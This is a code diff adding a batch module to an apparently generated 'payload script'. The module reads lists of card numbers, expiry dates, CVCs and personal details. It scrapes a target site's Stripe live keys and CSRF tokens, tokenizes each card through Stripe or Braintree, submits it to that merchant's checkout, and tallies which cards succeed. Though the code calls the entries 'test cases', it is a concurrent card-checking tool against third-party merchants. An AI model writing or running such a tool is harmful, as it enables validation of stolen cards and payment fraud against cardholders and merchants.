+    _base_url_r   = repr(url)
+
+    # Resolve values needed inside BatchProcessor at generation time
+    _eff_gw_step3 = gw_name if gw_name in ('Stripe', 'Braintree', 'Adyen') else hosted.get('gateway', '')
+    _csrf_name_r  = repr(csrf_name or '_token')
+
+    # Stripe pk_ for batch
+    _pk_val_batch = ''
+    for _rt in resolved.values():
+        _v = _rt.get('value', '')
+        if _v and re.match(r'pk_(?:live|test)_', _v):
+            _pk_val_batch = _v
+            break
+    if not _pk_val_batch:
+        for _ts in data.get('token_sources', []):
+            _v = _ts.get('value', '') or _ts.get('value_preview', '')
+            if _v and re.match(r'pk_(?:live|test)_', _v):
+                _pk_val_batch = _v
+                break
+
+    # Stripe token target fields for batch
+    _stripe_tok_fields = list(dict.fromkeys(
+        [ef['name'] for ef in (hosted.get('extra_fields') or []) if ef.get('name') and ef.get('required')]
+        + ['payment_method', 'stripeToken', 'paymentMethodId']
+    ))
+
+    # Braintree token + fields
+    _bt_token_batch = ''
+    for _rt in resolved.values():
+        _v = _rt.get('value', '')
+        if _v and len(_v) > 20 and not re.match(r'pk_', _v):
+            _bt_token_batch = _v[:80]
+            break
+    _bt_tok_fields = list(dict.fromkeys(
+        [ef['name'] for ef in (hosted.get('extra_fields') or []) if ef.get('name') and ef.get('required')]
+        + ['payment_method_nonce', 'nonce']
+    ))
+
+    _BATCH_SRC = _tw.dedent(f'''
+        # ══════════════════════════════════════════════════════════════════
+        #  Batch Processor — integrated with PayloadSession + extract_tokens
+        #  Reads test cases from a text file — one case per line.
+        #
+        #  File format (pipe-separated, order matches FIELD_COLUMNS):
+        #      card_number|MM/YY|cvc|email|first|last|zip|address|city|state|phone
+        #
+        #  Example:
+        #      4242424242424242|12/29|123|john@test.com|John|Doe|10001|123 Main St|New York|NY|2125551234
+        #
+        #  Run modes:
+        #      python script.py                    # single run (default)
+        #      python script.py --batch cases.txt  # batch mode
+        #      python script.py --batch cases.txt --concurrency 5
+        # ══════════════════════════════════════════════════════════════════
+
+        import asyncio, sys, time
+        from pathlib import Path
+        from typing  import NamedTuple
+
+        # ── Column order — matches your input file ────────────────────────
+        FIELD_COLUMNS: list[str] = [
+            "card_number",
+            "card_exp_mmyy",
+            "card_cvc",
+            "email",
+            "first_name",
+            "last_name",
+            "zip",
+            "address1",
+            "city",
+            "state",
+            "phone",
+        ]
+
+        # ── Result record ─────────────────────────────────────────────────
+        class CaseResult(NamedTuple):
+            line_no:    int
+            raw_line:   str
+            state:      str    # SUCCESS | FAILED | RE_VERIFICATION_REQUIRED
+            http_code:  int
+            score:      int
+            evidence:   str
+            elapsed_s:  float
+            error:      str
+
+
+        # ══════════════════════════════════════════════════════════════════
+        class BatchProcessor:
+            """
+            Async batch runner — reads pipe-separated test cases from a
+            local text file and executes the full 4-step workflow
+            concurrently, bounded by a semaphore.
+
+            Fully integrated with:
+              PayloadSession  — persistent session + retry + CSRF injection
+              extract_tokens  — hidden field / meta / JS token extraction
+              DynamicFieldMapper — field fingerprinting + random test data
+              ResponseAnalysisEngine — SUCCESS / FAILED / 3DS classification
+            """
+
+            _SUBMIT_URL         = {repr(_submit_url)}
+            _BASE_URL           = {_base_url_r}
+            _METHOD             = {repr(_method_low)}
+            _IS_JSON            = {_is_json}
+            _CT_HEADER          = {repr(_ct_hdr)}
+            _RAW_FIELDS         = {_raw_fields_r}
+            _GATEWAY            = {repr(_eff_gw_step3)}
+            _CSRF_KEY           = {_csrf_name_r}
+            _STRIPE_PK          = {repr(_pk_val_batch or 'pk_live_REPLACE_ME')}
+            _STRIPE_TOK_FIELDS  = {repr(_stripe_tok_fields)}
+            _BT_TOKEN           = {repr(_bt_token_batch or '')}
+            _BT_TOK_FIELDS      = {repr(_bt_tok_fields)}
+
+            def __init__(self, batch_file: str, concurrency: int = 3):
+                self.batch_file  = Path(batch_file)
+                self.concurrency = concurrency
+                self._sem        = asyncio.Semaphore(concurrency)
+                self._engine     = ResponseAnalysisEngine()
+                self._mapper     = DynamicFieldMapper()
+                self.results: list[CaseResult] = []
+
+            # ── File parsing ─────────────────────────────────────────────
+            def _parse_line(self, line_no: int, raw: str) -> dict:
+                """
+                Parse one pipe-separated line into a field overrides dict.
+                Extra columns are ignored; missing columns use empty string.
+                """
+                parts = [p.strip() for p in raw.strip().split("|")]
+                overrides: dict[str, str] = {{}}
+                for i, col in enumerate(FIELD_COLUMNS):
+                    overrides[col] = parts[i] if i < len(parts) else ""
+                # Also map expiry to separate month/year if combined MM/YY given
+                mmyy = overrides.get("card_exp_mmyy", "")
+                if mmyy and "/" in mmyy:
+                    mm, yy = mmyy.split("/", 1)
+                    overrides.setdefault("card_exp_month", mm.strip())
+                    overrides.setdefault("card_exp_year",
+                        ("20" + yy.strip()) if len(yy.strip()) == 2 else yy.strip())
+                return overrides
+
+            def _read_cases(self) -> list[tuple[int, str]]:
+                """Read file, skip blanks and # comment lines."""
+                cases = []
+                with open(self.batch_file, encoding="utf-8", errors="replace") as fh:
+                    for i, line in enumerate(fh, start=1):
+                        stripped = line.strip()
+                        if not stripped or stripped.startswith("#"):
+                            continue
+                        cases.append((i, stripped))
+                return cases
+
+            # ── Single-case worker (sync, runs in executor) ───────────────
+            def _run_one_sync(self, line_no: int, raw: str) -> CaseResult:
+                """Execute the full workflow for one test case (blocking)."""
+                t0 = time.perf_counter()
+                try:
+                    overrides = self._parse_line(line_no, raw)
+                    session   = PayloadSession(self._BASE_URL)
+
+                    # ── Step 1: Prime session + extract CSRF via extract_tokens ─
+                    r      = session.get(self._BASE_URL, timeout=15)
+                    tokens = extract_tokens(r.text)
+                    # Find first known CSRF key
+                    _CSRF_KEYS = (
+                        self._CSRF_KEY,
+                        "_token", "csrf_token", "csrfToken",
+                        "authenticity_token", "nonce", "_meta_csrf",
+                        "X-CSRF-TOKEN", "__RequestVerificationToken",
+                    )
+                    csrf      = next((tokens[k] for k in _CSRF_KEYS if k in tokens), "")
+                    csrf_key  = next((k         for k in _CSRF_KEYS if k in tokens), "_token")
+                    if csrf:
+                        session.set_csrf(csrf_key, csrf)
+
+                    # ── Step 2: Gateway tokenization (Stripe / Braintree / raw) ─
+                    _gw = self._GATEWAY
+                    _overrides = dict(overrides)   # start from file columns
+
+                    if _gw == "Stripe":
+                        import requests as _req
+                        _pk = self._STRIPE_PK
+                        _cn  = overrides.get("card_number",   "4242424242424242")
+                        _em  = overrides.get("card_exp_month","12")
+                        _ey  = overrides.get("card_exp_year", "2029")
+                        _cvc = overrides.get("card_cvc",      "123")
+                        _tok_r = _req.post(
+                            "https://api.stripe.com/v1/payment_methods",
+                            data={{
+                                "type":                      "card",
+                                "card[number]":              _cn,
+                                "card[exp_month]":           _em,
+                                "card[exp_year]":            _ey,
+                                "card[cvc]":                 _cvc,
+                            }},
+                            headers={{"Authorization": f"Bearer {{_pk}}"}},
+                            timeout=10,
+                        )
+                        if _tok_r.ok:
+                            _pm = _tok_r.json().get("id", "")
+                            if _pm:
+                                for _tf in self._STRIPE_TOK_FIELDS:
+                                    _overrides[_tf] = _pm
+
+                    elif _gw == "Braintree":
+                        import requests as _req
+                        _cn  = overrides.get("card_number",   "4111111111111111")
+                        _em  = overrides.get("card_exp_month","12")
+                        _ey  = overrides.get("card_exp_year", "2029")
+                        _cvc = overrides.get("card_cvc",      "123")
+                        _tok_r = _req.post(
+                            "https://payments.sandbox.braintree-api.com/graphql",
+                            json={{
+                                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {{ tokenizeCreditCard(input: $input) {{ token }} }}",
+                                "variables": {{
+                                    "input": {{
+                                        "creditCard": {{
+                                            "number": _cn, "expirationMonth": _em,
+                                            "expirationYear": _ey, "cvv": _cvc,
+                                        }}
+                                    }}
+                                }},
+                            }},
+                            headers={{
+                                "Authorization": f"Bearer {{self._BT_TOKEN}}",
+                                "Braintree-Version": "2019-01-01",
+                            }},
+                            timeout=10,
+                        )
+                        if _tok_r.ok:
+                            _nd = _tok_r.json().get("data", {{}})
+                            _nonce = (
+                                _nd.get("tokenizeCreditCard") or {{}}
+                            ).get("token", "")
+                            if _nonce:
+                                for _tf in self._BT_TOK_FIELDS:
+                                    _overrides[_tf] = _nonce
+
+                    # ── Step 3: Build POST body ───────────────────────────────
+                    post_body = self._mapper.build_form(
+                        fields    = self._RAW_FIELDS,
+                        overrides = _overrides,
+                        token_map = tokens,
+                    )
+
+                    # ── Step 4: Submit ────────────────────────────────────────
+                    if not self._SUBMIT_URL:
+                        return CaseResult(line_no, raw, "FAILED", 0, 0,
+                                          "no submit url", round(time.perf_counter()-t0,2), "")
+                    _post_kw = {{
+                        ("json" if self._IS_JSON else "data"): post_body,
+                        "headers": {{"Content-Type": self._CT_HEADER}},
+                        "timeout": 20,
+                        "allow_redirects": True,
+                    }}
+                    _method_fn = getattr(session, self._METHOD, session.post)
+                    resp = _method_fn(self._SUBMIT_URL, **_post_kw)
+
+                    # ── Step 5: Classify ──────────────────────────────────────
+                    analysis = self._engine.analyse(resp)
+                    top_ev   = " / ".join(
+                        m.split("(")[0] for m in analysis["matched"][:2]
+                    )
+                    elapsed = time.perf_counter() - t0
+                    return CaseResult(
+                        line_no   = line_no,
+                        raw_line  = raw,
+                        state     = analysis["state"],
+                        http_code = analysis["http_code"],
+                        score     = analysis["score"],
+                        evidence  = top_ev,
+                        elapsed_s = round(elapsed, 2),
+                        error     = "",
+                    )
+
+                except Exception as exc:
+                    return CaseResult(
+                        line_no   = line_no,
+                        raw_line  = raw,
+                        state     = "FAILED",
+                        http_code = 0,
+                        score     = 0,
+                        evidence  = "",
+                        elapsed_s = round(time.perf_counter() - t0, 2),
+                        error     = f"{{type(exc).__name__}}: {{exc}}",
+                    )
+
+            # ── Async wrapper + semaphore ─────────────────────────────────
+            async def _run_one_async(self, loop, line_no: int, raw: str) -> CaseResult:
+                async with self._sem:
+                    result = await loop.run_in_executor(
+                        None, self._run_one_sync, line_no, raw
+                    )
+                    self._print_live(result)
+                    return result
+
+            # ── Live progress line ────────────────────────────────────────
+            @staticmethod
+            def _print_live(r: CaseResult):
+                _icons = {{
+                    "SUCCESS":                  "✅",
+                    "FAILED":                   "🔴",
+                    "RE_VERIFICATION_REQUIRED": "🔐",
+                }}
+                icon = _icons.get(r.state, "⚪")
+                err  = f"  ERR: {{r.error[:60]}}" if r.error else ""
+                ev   = f"  ← {{r.evidence}}" if r.evidence else ""
+                print(
+                    f"  [{{r.line_no:>4}}] {{icon}} {{r.state:<26}}"
+                    f"  HTTP {{r.http_code}}  score {{r.score}}"
+                    f"  {{r.elapsed_s:.2f}}s{{ev}}{{err}}"
+                )
+
+            # ── Summary report ────────────────────────────────────────────
+            def _print_summary(self):
+                total   = len(self.results)
+                success = sum(1 for r in self.results if r.state == "SUCCESS")
+                failed  = sum(1 for r in self.results
+                              if r.state in ("FAILED",) and not r.error)
+                reverif = sum(1 for r in self.results
+                              if r.state == "RE_VERIFICATION_REQUIRED")
+                errors  = sum(1 for r in self.results if r.error)
+                avg_t   = (sum(r.elapsed_s for r in self.results) / total
+                           if total else 0)
+
+                print("\\n" + "═"*52)
+                print(f"  BATCH SUMMARY  —  {{total}} cases")
+                print("─"*52)
+                print(f"  ✅ SUCCESS                : {{success}}")
+                print(f"  🔴 FAILED                 : {{failed}}")
+                print(f"  🔐 RE-VERIFICATION        : {{reverif}}")
+                print(f"  ⚠️  Exceptions             : {{errors}}")
+                print(f"  ⏱️  Avg time/case           : {{avg_t:.2f}}s")
+                print("═"*52)
+
+                if errors:
+                    print("\\n  Errored lines:")
+                    for r in self.results:
+                        if r.error:
+                            print(f"    line {{r.line_no}}: {{r.error[:80]}}")
+
+            # ── Main entry ───────────────────────────────────────────────
+            async def run(self):
+                cases = self._read_cases()
+                if not cases:
+                    print(f"⚠️  No cases found in {{self.batch_file}}")
+                    return
+
+                print(f"\\n🚀 BatchProcessor — {{len(cases)}} cases"
+                      f"  concurrency={{self.concurrency}}"
+                      f"  file={{self.batch_file}}")
+                print(f"   Columns: {{FIELD_COLUMNS}}")
+                print("─"*52)
+
+                loop = asyncio.get_event_loop()
+                tasks = [
+                    self._run_one_async(loop, ln, raw)
+                    for ln, raw in cases
+                ]
+                self.results = list(await asyncio.gather(*tasks))
+                self._print_summary()
+
+
+        # ══════════════════════════════════════════════════════════════════
+        #  Entry point — single run OR batch mode
+        # ══════════════════════════════════════════════════════════════════
+        if __name__ == "__main__":
+            import argparse
+            ap = argparse.ArgumentParser(
+                description="Payload script — single or batch mode"
+            )
+            ap.add_argument("--batch",       metavar="FILE",
+                            help="Path to pipe-delimited test-case file")
+            ap.add_argument("--concurrency", metavar="N", type=int, default=3,
+                            help="Max concurrent workers (default: 3)")
+            args = ap.parse_args()
+
+            if args.batch:
+                # ── Batch mode ────────────────────────────────────────────
+                processor = BatchProcessor(
+                    batch_file  = args.batch,
+                    concurrency = args.concurrency,
+                )
+                asyncio.run(processor.run())
+            else:
+                # ── Single mode (original Steps 1-4 above already ran) ────
+                print("\\n[Single mode] Steps 1-4 executed above.")
+                print("To run batch mode: python script.py --batch cases.txt")
+    ''').lstrip('\n')
+    sc.append(_BATCH_SRC)
 
     return '\n'.join(sc) + '\n'
 
